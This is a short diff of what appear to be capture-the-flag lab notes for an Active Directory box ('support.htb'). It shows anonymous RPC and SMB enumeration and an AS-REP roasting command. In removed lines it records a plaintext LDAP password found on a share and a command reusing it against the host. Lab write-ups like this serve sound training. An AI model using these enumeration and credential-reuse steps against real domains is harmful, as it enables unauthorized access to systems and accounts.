@@ -60,17 +60,3 @@ rpcclient -U "" -N 10.129.141.87
 
 `GetNPUsers.py support.htb/ -no-pass -usersfile users.txt -dc-ip 10.129.141.87`
 
-
-smbclient //10.129.141.87/support-tools -N
-
-inside support tools
-
-![alt text](image.png)
-
-plain password
-
-nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
-
-support.htb\ldap
-
-nimux ldap 10.129.141.87 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb
